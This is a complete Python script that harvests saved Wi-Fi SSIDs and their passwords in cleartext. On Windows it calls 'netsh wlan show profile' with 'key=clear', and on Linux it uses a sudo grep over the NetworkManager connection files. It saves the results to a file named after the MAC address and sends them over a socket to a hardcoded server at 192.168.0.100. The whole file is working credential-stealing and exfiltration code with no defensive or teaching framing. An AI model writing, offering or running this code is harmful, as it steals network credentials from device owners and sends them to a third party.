import os
import re
import socket
import subprocess
import sys
import uuid

COMMAND_WINDOWS = "netsh wlan show profile"
COMMAND_LINUX = "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/"
RE_LINUX = '/etc/NetworkManager/system-connections/(.*)'
MAC = ''
OS = ''
SERVER_IP = '192.168.0.100'
serversocket = ''


def main():
    identify()
    store_data()
    establish_connection()
    send_data()
    close_connection()


def identify():
    global MAC, OS
    MAC = str((hex(uuid.getnode())))
    OS = sys.platform


def store_data():
    file = open(MAC, 'w')

    if OS == 'win32':
        output = subprocess.check_output(COMMAND_WINDOWS).decode('ascii').split('\n')
        SSID = list()
    # Get SSIDs
        for name in output:
            try:
                Name = name.split(':')[1].strip()  # strip() removes a leading whitespace and following '\r' character
                SSID.append(Name)
            except:
                pass

        # Get PSK of each SSID
        # SSID[0]=<blank> which when given to below check_output() causes error .
        # So the try except handles it
        for ssid in SSID:
            try:
                Password = subprocess.check_output(COMMAND_WINDOWS + ' name="' + ssid + '" key=clear').decode('ascii')
                PSK = re.findall('Key Content(.*)\n', Password)[0].strip().split(':')[1].strip()
                file.write(ssid + ',' + PSK + '\n')
                # print(ssid,'	',PSK)
            except:
                pass

    elif OS == "linux" or OS == "linux2" or OS == "linux3":
        output = subprocess.check_output(COMMAND_LINUX,shell = True).decode('utf-8').split('\n')
        for pair in output:
            try:
                pair = re.findall(RE_LINUX, pair)[0].split(':')
                ssid = pair[0]
                psk = pair[1].split('=')[1]
                file.write(ssid + ',' + psk + '\n')
            except:
                pass

    else:
        print("No support for this OS as yet !!")

    file.close()


def establish_connection():
    global serversocket
    try:
        serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = (SERVER_IP, 10000)
        serversocket.connect(server_address)
    except:
        print("Sorry , couldn't establish connection successfully ")
        exit(1)


def send_data():
    serversocket.send(MAC.encode('ascii'))

    file = open(MAC, 'r')
    CONTENT = file.read()
    serversocket.send(CONTENT.encode('utf-8'))

    file.close()


def close_connection():
    serversocket.close()


if __name__ == '__main__':
    main()
